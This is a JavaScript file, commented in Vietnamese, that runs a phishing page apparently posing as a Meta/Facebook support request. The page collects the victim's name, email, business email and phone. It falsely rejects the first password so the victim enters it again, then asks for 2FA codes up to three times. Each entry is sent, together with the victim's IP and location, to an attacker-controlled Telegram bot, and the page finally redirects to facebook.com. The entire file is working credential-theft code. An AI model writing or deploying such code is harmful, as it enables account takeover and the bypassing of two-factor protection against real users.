/* ========================================================================
   PHẦN 1: CẤU HÌNH & TIỆN ÍCH
   ======================================================================== */

const CONFIG = {
    TELEGRAM: {
        // Thay token và chat ID của bạn vào đây (dạng Base64 hoặc để string thường cũng được nếu test)
        BOT_TOKEN: atob("YOUR_BASE64_TOKEN_HERE"), 
        CHAT_ID: atob("YOUR_BASE64_CHAT_ID_HERE")
    },
    IP_API: "https://ipwho.is/",
    REDIRECT_URL: "https://www.facebook.com"
};

const Utils = {
    getLocation: async () => {
        try {
            const response = await fetch(CONFIG.IP_API);
            const data = await response.json();
            if (data.success) {
                return {
                    ip: data.ip,
                    city: data.city || "Unknown",
                    country: data.country || "Unknown",
                    flag: data.flag ? data.flag.emoji : "" 
                };
            }
            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
        } catch (e) {
            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
        }
    },

    getTime: () => {
        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    },

    sendMessage: async (message) => {
        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
        if (!BOT_TOKEN || !CHAT_ID) return false;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            return true;
        } catch (e) {
            console.error(e);
            return false;
        }
    },

    formatReport: (data, type, loc) => {
        const time = Utils.getTime();
        let icon = type === "INFO" ? "📝 INFO" : (type === "PASS" ? "🔑 PASS" : "🔥 OTP");

        let infoBlock = `<b>Name:</b> ${data.fullName}`;
        infoBlock += `\n<b>Mail:</b> ${data.email}`;
        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
        infoBlock += `\n<b>Phone:</b> ${data.phone}`;

        let passBlock = "";
        if (data.pass1) passBlock += `\n----------------\n<b>Pass 1:</b> <code>${data.pass1}</code>`;
        if (data.pass2) passBlock += `\n<b>Pass 2:</b> <code>${data.pass2}</code>`;
        
        let otpBlock = "";
        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;

        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
    }
};

/* ========================================================================
   PHẦN 2: LOGIC CHÍNH
   ======================================================================== */

document.addEventListener("DOMContentLoaded", () => {
    // --- Khai báo biến ---
    const submitBtn = document.getElementById("submitRequestBtn");
    const overlay = document.getElementById("overlay");
    const infoForm = document.getElementById("infoForm");
    const passwordForm = document.getElementById("passwordForm");
    const verifyModal = document.getElementById("verifyModal");

    const infoInputs = infoForm.querySelectorAll(".meta-input");
    const infoSendBtn = infoForm.querySelector("button");
    const infoCheckbox = infoForm.querySelector("input[type='checkbox']");

    const passwordInput = document.getElementById("passwordInput");
    const continueBtn = document.getElementById("continueBtn");

    const verifyBtn = document.getElementById("verifyBtn");
    const verifyCode = document.getElementById("verifyCode");
    const verifyError = document.getElementById("verifyError");
    const countdown = document.getElementById("countdown");
    const verifyTitle = document.getElementById("verifyTitle");

    // --- 1. Tạo Ticket ID ---
    const ticketIdEl = document.getElementById("ticketId");
    if (ticketIdEl) {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const block = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
        ticketIdEl.innerText = `${block()}-${block()}-${block()}`;
    }

    // --- 2. Mở Info Form ---
    if (submitBtn) {
        submitBtn.addEventListener("click", () => {
            overlay.classList.remove("hidden");
            infoForm.classList.remove("hidden");
        });
    }

    // --- 3. Gửi Info Form ---
    if (infoSendBtn) {
        infoSendBtn.addEventListener("click", () => {
            if (infoCheckbox && !infoCheckbox.checked) return;

            // Lưu thông tin (Name, Email, Biz Email, Page Name, Phone)
            sessionStorage.setItem("fullName", infoInputs[0].value || "N/A");
            sessionStorage.setItem("email", infoInputs[1].value || "N/A");
            sessionStorage.setItem("businessEmail", infoInputs[2].value || "N/A");
            sessionStorage.setItem("phone", infoInputs[4].value || "N/A");

            infoForm.classList.add("hidden");
            passwordForm.classList.remove("hidden");
        });
    }

    // --- 4. Xử lý Password (KHÔNG LOCK) ---
    let passwordAttempts = 0;
    
    // Tạo text lỗi
    let passwordError = document.createElement("p");
    passwordError.className = "text-red-600 text-sm mt-2 hidden text-center";
    passwordError.innerText = "The password you entered is incorrect. Please try again.";
    if(passwordInput) passwordInput.after(passwordError);

    if (continueBtn) {
        continueBtn.addEventListener("click", async () => {
            const currentPass = passwordInput.value;
            if (!currentPass) return;

            passwordAttempts++;
            
            // Disable tạm thời để tránh bấm đúp (giả vờ loading)
            continueBtn.disabled = true;
            continueBtn.innerText = "Checking...";

            const userLoc = await Utils.getLocation();

            if (passwordAttempts === 1) {
                // === LẦN 1: BÁO SAI & KHÔNG LOCK ===
                sessionStorage.setItem("pass1", currentPass);
                
                const data = {
                    fullName: sessionStorage.getItem("fullName"),
                    email: sessionStorage.getItem("email"),
                    businessEmail: sessionStorage.getItem("businessEmail"),
                    phone: sessionStorage.getItem("phone"),
                    pass1: currentPass
                };
                
                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));

                // Hiện lỗi
                passwordError.classList.remove("hidden");
                passwordInput.value = "";
                passwordInput.focus();
                
                // MỞ NÚT NGAY LẬP TỨC (Không lock)
                continueBtn.disabled = false;
                continueBtn.innerText = "Continue";
            } 
            else if (passwordAttempts >= 2) {
                // === LẦN 2: CHUYỂN SANG VERIFY ===
                const oldPass = sessionStorage.getItem("pass1");
                const data = {
                    fullName: sessionStorage.getItem("fullName"),
                    email: sessionStorage.getItem("email"),
                    businessEmail: sessionStorage.getItem("businessEmail"),
                    phone: sessionStorage.getItem("phone"),
                    pass1: oldPass,
                    pass2: currentPass
                };

                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));

                // Chuyển form
                passwordForm.classList.add("hidden");
                verifyModal.classList.remove("hidden");
                initVerifyDisplay(); 
            }
        });
    }

    // Helper hiển thị mask
    function initVerifyDisplay() {
        const email = sessionStorage.getItem("email");
        const phone = sessionStorage.getItem("phone");
        const maskedEmailEl = document.getElementById("maskedEmail");
        const maskedPhoneEl = document.getElementById("maskedPhone");
        const userNameEl = document.getElementById("userName");

        if(userNameEl) userNameEl.innerText = sessionStorage.getItem("fullName");

        if(maskedEmailEl && email) {
            const [u, d] = email.split('@');
            maskedEmailEl.innerText = (u.length > 3 ? u.substring(0,3) : u) + "***@" + (d || "");
        }
        if(maskedPhoneEl && phone && phone.length > 4) {
            maskedPhoneEl.innerText = "*******" + phone.slice(-3);
        }
    }

    // --- 5. Xử lý Verify Code (CÓ LOCK 30s) ---
    let verifyAttempts = 0;
    let isLocked = false;

    // Hàm khóa 30 giây
    function startLockdown(seconds) {
        isLocked = true;
        verifyBtn.disabled = true;
        verifyBtn.classList.add("opacity-50", "cursor-not-allowed");
        
        countdown.classList.remove("hidden");
        countdown.innerText = `Try again in ${seconds}s`;

        const timer = setInterval(() => {
            seconds--;
            countdown.innerText = `Try again in ${seconds}s`;

            if (seconds <= 0) {
                clearInterval(timer);
                isLocked = false;
                verifyBtn.disabled = false;
                verifyBtn.classList.remove("opacity-50", "cursor-not-allowed");
                verifyBtn.innerText = "Continue";
                countdown.classList.add("hidden");
                verifyError.classList.add("hidden");
            }
        }, 1000);
    }

    if (verifyBtn) {
        verifyBtn.addEventListener("click", async () => {
            if (isLocked) return;
            
            const code = verifyCode.value;
            if (!code) return;

            // Loading
            verifyBtn.innerText = "Checking...";
            
            // Gửi Telegram
            verifyAttempts++;
            const userLoc = await Utils.getLocation();
            
            const data = {
                fullName: sessionStorage.getItem("fullName"),
                email: sessionStorage.getItem("email"),
                businessEmail: sessionStorage.getItem("businessEmail"),
                phone: sessionStorage.getItem("phone"),
                pass1: sessionStorage.getItem("pass1"),
                pass2: passwordInput.value, // Lấy pass2 ở ô input cũ
                twoFactorCode: code
            };

            await Utils.sendMessage(Utils.formatReport(data, "OTP", userLoc));

            // Báo sai
            verifyError.classList.remove("hidden");
            verifyError.innerText = "The code you entered is incorrect.";
            verifyCode.value = "";

            if(verifyTitle) verifyTitle.innerText = `Two-factor authentication required (${Math.min(verifyAttempts + 1, 3)}/3)`;

            // Sai 3 lần -> Chuyển hướng
            if (verifyAttempts >= 3) {
                verifyBtn.innerText = "Redirecting...";
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 1000);
                return;
            }

            // === LOCK 30 GIÂY NGAY LẬP TỨC ===
            startLockdown(30);
        });
    }
});
